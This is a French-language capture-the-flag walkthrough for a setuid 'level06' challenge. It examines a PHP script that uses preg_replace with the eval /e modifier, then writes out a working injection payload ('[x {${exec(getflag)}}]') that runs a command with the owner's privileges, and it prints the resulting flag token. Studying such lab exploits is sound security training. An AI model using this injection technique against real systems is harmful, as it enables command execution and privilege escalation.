# Level 06

```bash
$ ls -la
total 24
dr-xr-x---+ 1 level06 level06  140 Mar  5  2016 .
d--x--x--x  1 root    users    340 Aug 30  2015 ..
-r-x------  1 level06 level06  220 Apr  3  2012 .bash_logout
-r-x------  1 level06 level06 3518 Aug 30  2015 .bashrc
-r-x------  1 level06 level06  675 Apr  3  2012 .profile
-rwsr-x---+ 1 flag06  level06 7503 Aug 30  2015 level06
-rwxr-x---  1 flag06  level06  356 Mar  5  2016 level06.php
```

2 fichiers, un executable et un fichier php.

```bash
$ getfacl level06 level06.php
# file: level06
# owner: flag06
# group: level06
# flags: s--
user::rwx
group::---
group:level06:r-x
mask::r-x
other::---

# file: level06.php
# owner: flag06
# group: level06
user::rwx
group::r-x
other::---

$ ./level06
PHP Warning:  file_get_contents(): Filename cannot be empty in /home/user/level06/level06.php on line 4
```

On voit que les fichiers appartiennent a flag06 et que level06 sera execute avec les droits de son proprietaire (flag s--)
On peut deduire que level06 prend en parametre un fichier et execute level06.php avec celui-ci.

```bash
$ cat level06.php
#!/usr/bin/php
<?php
function y($m) {
	$m = preg_replace("/\./", " x ", $m);
	$m = preg_replace("/@/", " y", $m);
	return $m;
}
function x($y, $z) {
	$a = file_get_contents($y);
	$a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
	$a = preg_replace("/\[/", "(", $a);
	$a = preg_replace("/\]/", ")", $a);
	return $a;
}
$r = x($argv[1], $argv[2]);
print $r;
?>
```
preg_replace(pattern, remplacement, subject) va extraire le contenu du fichier chercher un pattern, ici "[x" suivie de n'importe puis "]"
le modifier e indique que remplacement doit etre eval en tant que script php


```bash
$ echo '[x {${exec(getflag)}}]' > /tmp/test
$ ./level06 /tmp/test
PHP Notice:  Use of undefined constant getflag - assumed 'getflag' in /home/user/level06/level06.php(4) : regexp code on line 1
PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub in /home/user/level06/level06.php(4) : regexp code on line 1
```
On peut utiliser le modifier e pour pouvoir executer getflag.
Le programme va remplacer "[x {${exec(getflag)}}]" par "eval('return y("{${exec(getflag)}}");')" donc va evaluer ${exec(getflag)} avec les droits de flag06
On met exec(getflag) dans une syntaxe d'interpolation car en remplacant la chaine elle devient entre guillemet.


